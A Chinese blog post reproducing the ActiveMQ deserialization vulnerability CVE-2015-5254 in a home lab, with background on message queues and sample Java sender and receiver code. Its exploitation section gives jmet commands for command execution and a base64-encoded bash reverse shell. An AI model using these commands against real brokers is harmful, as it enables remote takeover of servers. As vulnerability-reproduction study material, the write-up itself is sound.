# 漏洞复现 - ActiveMQ反序列化漏洞(CVE-2015-5254) - Sally_Zhang - 博客园

> 原文：[https://www.cnblogs.com/sallyzhang/p/12289983.html](https://www.cnblogs.com/sallyzhang/p/12289983.html)

**基础知识**

MQ(Message Queue)：消息队列/消息中间件。消息服务将消息放在队列／主题中，在合适时候发给接收者。发送和接收是异步的（发送者和接收者的生命周期没有必然关系）。

*   队列：消息存在队列中，发送和接收都是异步的
*   主题：在发布pub／订阅sub模式下，发送消息给固定接收者（订阅过主题的），一对多的通信方式

MQ解决的问题：

*   解耦：新模块接入时，代码改动最小
*   消峰：设置流量缓冲池，让后端系统按照自身吞吐能力消费，不被冲垮
*   异步：强弱依赖梳理能将非关键调用链路的操作异步化，并提升整体系统的吞吐能力

产品种类：Kafka, RabbitMQ, RocketMQ, ActiveMQ

ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务、集群、Spring Framework等。

**漏洞原理**

该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码。

**影响版本** 

5.13.0之前5.x版本

**复现环境**

将ActiveMQ部署在MAC上，使用版本为apache-activemq-5.11.1，MAC上有JDK1.7和JDK1.8两个版本(**应使用JDK1.7**)。

漏洞利用库`jmet-0.1.0-all.jar`：[https://github.com/matthiaskaiser/jmet](https://github.com/matthiaskaiser/jmet)

**复现过程**

参考教程：[https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2015-5254/README.zh-cn.md](https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2015-5254/README.zh-cn.md)

1\. 安装和启动ActiveMQ

*   解压：tar -zxvf apache-activemq-5.11.0-bin.tar.gz，新建文件夹myactiveMQ，把解压的压缩包pache-activemq-5.11.0拷过去
*   终端进入myactiveMQ/pache-activemq-5.11.0/bin
*   启动命令：./activemq start （默认端口61616）

    ![](../Images/38a89455ca269e5387848d9f09d7cff6.png)

*   控制台页面：[http://localhost:8161/admin/](http://localhost:8161/admin/)

     ![](../Images/d831f12a96ca15869bc188330c964696.png)

2\. 写code给ActiveMQ发送和接收消息（为了加深理解，不是必须步骤）

消息发送方：

![](../Images/8f900a89c6347c561fdf2122f13be562.png)![](../Images/961ddebeb323a10fe0623af514929fc1.png)

```
import org.apache.activemq.ActiveMQConnectionFactory; import javax.jms.*; public class JmsProduce { public static final String ACTIVEMQ_URL="tcp://localhost:61616"; public static final String QUEUE_NAME="queue01"; public static void main(String[] args) throws JMSException { //采用默认用户名和密码
        ActiveMQConnectionFactory activeMQConnectionFactory = new ActiveMQConnectionFactory(ACTIVEMQ_URL);
        Connection connection = activeMQConnectionFactory.createConnection();
        connection.start();

        Session session = connection.createSession(false, Session.AUTO_ACKNOWLEDGE);
        Queue queue = session.createQueue(QUEUE_NAME);

        MessageProducer messageProducer = session.createProducer(queue); //使用messageProducer生产3条消息发送到MQ队列
        for (int i=0;i<3;i++){
            TextMessage textMessage=session.createTextMessage("msg----"+i);
            messageProducer.send(textMessage);
        }

        messageProducer.close();
        session.close();
        connection.close();

        System.out.println("******消息发布到MQ完成******");
    }
}
```

View Code

消息接收方：

![](../Images/8f900a89c6347c561fdf2122f13be562.png)![](../Images/961ddebeb323a10fe0623af514929fc1.png)

```
import org.apache.activemq.ActiveMQConnectionFactory; import javax.jms.*; public class JmsConsumer { public static final String ACTIVEMQ_URL = "tcp://localhost:61616"; public static final String QUEUE_NAME = "queue01"; public static void main(String[] args) throws JMSException { //采用默认用户名和密码
        ActiveMQConnectionFactory activeMQConnectionFactory = new ActiveMQConnectionFactory(ACTIVEMQ_URL);
        Connection connection = activeMQConnectionFactory.createConnection();
        connection.start();

        Session session = connection.createSession(false, Session.AUTO_ACKNOWLEDGE);
        Queue queue = session.createQueue(QUEUE_NAME);

        MessageConsumer messageConsumer = session.createConsumer(queue); while (true) {

            TextMessage textMessage = (TextMessage) messageConsumer.receive(); if (textMessage != null) {
                System.out.println("******接收道消息:" + textMessage.getText());
            } else { break;
            }
        }

        messageConsumer.close();
        session.close();
        connection.close();
    }
}
```

View Code

发送消息后查看队列：

![](../Images/4603d20113f3fc95551423bd013c50d3.png)

接收消息后查看队列：

![](../Images/d7ea2d457df206ead44f0ef49ca82db8.png)

3\. 漏洞利用

下载：jmet-0.1.0-all.jar，在同目录下新建external文件夹(表问为什么，建了就是了)

(1) 执行恶意命令

执行命令：

```
java -jar jmet-0.1.0-all.jar -Q myevent -I ActiveMQ -s -Y "touch /tmp/success" -Yp ROME 192.168.101.9 61616
```

命令执行之后，打开ActiveMQ控制台，会发现新建了一个名为event的队列，并发送了一条消息：

![](../Images/f7bc60359ec2599f6d893a2a574844de.png)

此时只要在控制台点击查看该消息，就会在apache-activemq-5.11.1/tmp下面新建一个名为sucess的文件(**如果看到该文件，说明在发消息的时候发送的恶意代码"touch /tmp/sucess"执行成功，漏洞利用成功**)，然而我在打开消息详情页面的时候报错了：

![](../Images/96fb95e11a6cb2620e6339249536a9af.png)

排查之后，发现是jdk版本和activeMQ版本不匹配造成的(刚开始我用的jdk1.8)，5.11版本应使用jdk1.7。切换jdk版本后再试一次，查看消息成功：

![](../Images/04eedfd8333776dc4e5f4c776197e9fc.png)

命令执行成功，说明执行任意代码的漏洞确实存在：

![](../Images/b84e4bbd4cb0c25aa39e2f6e92645f4c.png)

(2) 反弹shell

执行命令：

```
java -jar jmet-0.1.0-all.jar -Q myevent -I ActiveMQ -Y "bash -c {echo YmFzaCAtaSAmZ3Q7Ji9kZXYvdGNwLzE5Mi4xNjguMTAxLjE0LzEzMTQgMCZndDsmMQ==}|{base64,-d}|{bash,-i}" -Yp ROME 192.168.101.9 61616
```

反弹成功：

![](../Images/0af85f1ab1b093a8c80cf4d600541d09.png) 

****本文仅用于技术学习和交流，严禁用于非法用途，否则产生的一切后果自行承担。****